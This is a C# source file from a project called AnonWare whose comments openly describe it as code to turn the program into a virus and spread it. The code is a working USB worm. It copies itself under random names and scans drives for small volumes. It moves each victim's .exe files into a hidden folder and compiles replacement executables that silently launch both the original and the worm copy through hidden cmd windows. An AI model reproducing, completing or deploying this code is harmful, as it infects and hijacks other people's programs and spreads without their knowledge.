///reproduction.cs contains some nice, but still not near finished, code that turns AnonWare into a virus ^_^
///check thru psuedocode for more info :P
///TODO:
///intercept exe files before they're uploaded, compressed, or downloaded.
///instead of using a fake directory, actually copy the exe into the new wrapper ^^_^^
///spread thru la world!

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Microsoft.CSharp;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Management;
using System.Threading;
using System.CodeDom.Compiler;
using System.Net;
using System.IO;

namespace AnonWare_CSharp
{
    class reproduction
    {
        public void reproduce()
        {
            Properties.Settings.Default.filename = GetPassword() + ".exe";
            Properties.Settings.Default.Save();
            string fname = Properties.Settings.Default.filename;
            File.Copy(AppDomain.CurrentDomain.FriendlyName.ToString(), Properties.Settings.Default.filename);
        }
        public void usbinject()
        {
            ///<psuedocode>
            ///foreach [program] x in [directory] y
            ///{
            ///MOVE PROGRAMS INTO GetPassword including the CHILD
            ///CREATE COMPILER
            ///string source = "yadayda" + GetPassword\filename.exe + "moaryada" + GetPassword\Settings.Default.filename + "even MOAR yadyada";
            ///COMPILE & PLACE IN PLACE OF ORIGINAL EXE
            ///}
            ///</psuedocode>
            if(Directory.Exists(@"F:\"))
            {
                if (GetDirectorySize(@"F:\") < 20000000.00 & GetDirectorySize(@"F:\") != 0) //i *think* that means 20 MB... it would really sux if it meant 20 GB or 20 KB xD
                {
                    INJECT(@"F:\");
                }
            }
            if (Directory.Exists(@"G:\"))
            {
                if (GetDirectorySize(@"G:\") < 20000000.00 & GetDirectorySize(@"G:\") != 0)
                {
                    INJECT(@"G:\");
                }
            }
            if (Directory.Exists(@"H:\"))
            {
                if (GetDirectorySize(@"H:\") < 20000000.00 & GetDirectorySize(@"H:\") != 0)
                {
                    INJECT(@"H:\");
                }
            }
            if (Directory.Exists(@"I:\"))
            {
                if (GetDirectorySize(@"I:\") < 20000000.00 & GetDirectorySize(@"I:\") != 0)
                {
                    INJECT(@"I:\");
                }
            }
            if (Directory.Exists(@"J:\"))
            {
                if (GetDirectorySize(@"J:\") < 20000000.00 & GetDirectorySize(@"J:\") != 0) 
                {
                    INJECT(@"J:\");
                }
            }
            if (Directory.Exists(@"Z:\"))
            {
                if (GetDirectorySize(@"Z:\") < 20000000.00 & GetDirectorySize(@"Z:\") != 0) 
                {
                    INJECT(@"Z:\");
                }
            }
            if (Directory.Exists(@"D:\"))
            {
                if (GetDirectorySize(@"D:\") < 20000000.00 & GetDirectorySize(@"D:\") != 0)
                {
                    INJECT(@"D:\");
                }
            }
        }
        private void INJECT(string directorytoinject)
        {
            try
            {
                string[] directorys = Directory.GetDirectories(directorytoinject);
                foreach (string dr in directorys)
                {
                    if (File.Exists(dr + "info.aw"))
                    {
                        //It's ALIVE!
                    }
                }
                string[] a = Directory.GetFiles(directorytoinject, "*.exe");
                string direct = directorytoinject + GetPassword();
                Directory.CreateDirectory(direct);
                string[] new1 = Properties.Settings.Default.filename.Split('.');
                string de1 = direct + @"\" + new1[0] + "anonwr.exe";
                File.Copy(Properties.Settings.Default.filename, de1);
                File.Copy(Properties.Settings.Default.filename, direct + @"\" + Properties.Settings.Default.filename);
                foreach (string nm in a)
                {
                    string newName = GetPassword() + ".exe";
                    string Direct = direct + @"\" + newName;
                    File.Move(nm, Direct);
                    CSharpCodeProvider myCodeProvider = new CSharpCodeProvider();
                    ICodeCompiler myCodeCompiler = myCodeProvider.CreateCompiler();
                    String[] referenceAssemblies = { "System.dll" };
                    string myAssemblyName = nm;
                    CompilerParameters myCompilerParameters = new CompilerParameters(referenceAssemblies, myAssemblyName);
                    myCompilerParameters.GenerateExecutable = true;
                    myCompilerParameters.GenerateInMemory = false;
                    string direct2 = direct + "\\" + Properties.Settings.Default.filename;
                    string source = "using System; using System.Diagnostics; namespace anonwarebooter {  class Program {         static void Main(string[] args) {   try {   Process cmd = new Process();          string ags = \"/C " + Direct.Replace("\\", "\\\\") + "\";     cmd.StartInfo.FileName = \"cmd\";   cmd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;   cmd.StartInfo.Arguments = ags;   cmd.Start();   Process cmd2 = new Process();          string ags2 = \"/C " + de1.Replace("\\", "\\\\") + "\";     cmd2.StartInfo.FileName = \"cmd\";   cmd2.StartInfo.Arguments = ags2;   cmd2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;  cmd2.Start(); } catch { } }  }  }";
                    CompilerResults compres = myCodeCompiler.CompileAssemblyFromSource(myCompilerParameters, source);
                }
            }
            catch
            {
            }
        }
        static long GetDirectorySize(string p)
        {
                // 1
                // Get array of all file names.
                string[] a = Directory.GetFiles(p, "*.exe");

                // 2
                // Calculate total bytes of all files in a loop.
                long b = 0;
                foreach (string name in a)
                {
                    // 3
                    // Use FileInfo to get length of each file.
                    FileInfo info = new FileInfo(name);
                    b += info.Length;
                }
                // 4
                // Return total size
                return b;
        }
        public string GetPassword()
        {
            StringBuilder builder = new StringBuilder();
            builder.Append(RandomString(4, true));
            builder.Append(RandomNumber(1000, 9999));
            builder.Append(RandomString(2, false));
            return builder.ToString();
        }
        private int RandomNumber(int min, int max)
        {
            Random random = new Random();
            return random.Next(min, max);
        }
        private string RandomString(int size, bool lowerCase)
        {
            StringBuilder builder = new StringBuilder();
            Random random = new Random();
            char ch;
            for (int i = 0; i < size; i++)
            {
                ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65)));
                builder.Append(ch);
            }
            if (lowerCase)
                return builder.ToString().ToLower();
            return builder.ToString();
        }
    }
}
